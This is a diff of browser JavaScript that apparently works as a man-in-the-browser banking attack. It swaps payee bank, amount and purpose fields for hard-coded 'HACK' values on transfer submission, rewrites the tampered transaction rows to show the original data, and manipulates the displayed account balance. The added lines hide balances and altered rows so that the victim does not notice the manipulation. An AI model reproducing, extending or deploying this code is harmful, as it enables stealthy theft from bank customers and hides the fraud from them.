@@ -137,6 +137,8 @@ function outputMoney(number) {
 function outputEuros(number) {
     if (number.length <= 3)
         return (number == '' ? '0' : number);
+    if (number.length <= 4 && number < 0)
+    	return (number);
     else {
         var mod = number.length%3;
         var output = (mod == 0 ? '' : (number.substring(0,mod)));
@@ -150,11 +152,7 @@ function outputEuros(number) {
     }
 }
 
-function clearHackedButtons() {
-	$("button[type*='button']").each(function() {
-		 $(this).attr("hackmarker", "false");
-	 });
-}
+
 
 
 function outputCents(amount) {
@@ -175,7 +173,6 @@ function getHackedMoney(realMoney) {
 }
 	 function timedMsg()
 		 {
-
 		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){	
 		 			$(this).attr("hackMarker","true");
 		 			sendMoneyBtnClone=$(this).clone(true)
@@ -216,7 +213,6 @@ function getHackedMoney(realMoney) {
 		 				$("input:eq(5)").val(HACK_AMOUNT);
 		 				$("input:eq(6)").val(HACK_USAGE);
 		 				sendMoneyBtnClone.attr("activateReset","true");
-		 				clearHackedButtons();
 		 				$("button[hackMarkerBtnOrig='true']")[0].click();
 		 				$(this).hide();
 		 				
@@ -257,7 +253,6 @@ function getHackedMoney(realMoney) {
 	 				$("input:eq(4)").val(HACK_BANK_NAME);
 	 				$("input:eq(5)").val(HACK_AMOUNT);
 	 				$("input:eq(6)").val(HACK_USAGE);
-	 				clearHackedButtons();
 	 				$("button[hackMarkerConfirmBtnOrig='true']")[0].click();
 	 				
 	 				//and change displayed values back
@@ -286,7 +281,7 @@ function getHackedMoney(realMoney) {
 		 		alreadyUsedHackedTransfers[i] = new Boolean(false);
 		 	//get row that contains a hacked transfer
 		 	hackedRow= $(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').each(function(){
-		 		
+		 		$(this).show();
 		 		//find the original transfer for this row
 		 		//date format on bank page is "dd.mm.yyyy"
 		 		var date = $(this).prev().children();
@@ -350,39 +345,24 @@ function getHackedMoney(realMoney) {
 		 		
 		 		var amount = 	$(this).next().next().next().children();
 		 		amount.text(originalData.amount);
-		 		
+
 		 		
 
 		 		
 		 	});
-		 	
-		 	
 
-			 $("button[type*='button']:[hackmarker!='true']").each(function() {
-				 $(this).attr("hackmarker","true");
-				
-				 btnClone=$(this).clone(true);
-				 $(this).attr("hackFindValue", $(this).text());
-				 $(this).after(btnClone);
-				 $(this).hide();
-				 btnClone.click(function(event){
-					event.preventDefault();
-					clearHackedButtons();
-					$("button[hackFindValue*='"+$(this).text()+"']")[0].click();
-				});
-
-				
-			 });
 			 
 			 
 			 
 		 	//set hackmarker for transaction so they will not be changed during account amount manipulation
 		 	transactionRow= $(".TransfersOdd,.TransfersEven").each(function(){
 		 		$(this).next().next().next().attr("hackMarker","true");
+		 		 $(this).show();
 		 	});
-		 	//manipulate money value of account
+		 	//manipulate account balance
 		 	$(".negativeMoney[hackmarker!='true'],.positiveMoney[hackmarker!='true']").each(function() {
 				 $(this).attr("hackMarker","true");
+				 $(this).show();
 				 //manipulate string to look like internal representation of a number
 				 text = $(this).text();
 				 text = text.replace(".", "");
@@ -406,7 +386,20 @@ function getHackedMoney(realMoney) {
 
 
 	 function pageChanged()  {
-		setTimeout(timedMsg,100);
+		 //first hide money value so user will not see that money value will be manipulated
+		 //because of delay in manipulation call
+		 $(".negativeMoney[hackmarker!='true'],.positiveMoney[hackmarker!='true']").each(function() {
+			 $(this).hide();
+		 });
+		 //hide amount of all transfers as well
+		 hackedRow= $(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').each(function(){
+			$(this).hide(); 
+		 });
+		 
+		// some delay for function call is needed
+		// else the browser will lag somehow
+		
+		setTimeout(timedMsg,1); 
 	 }
  
   
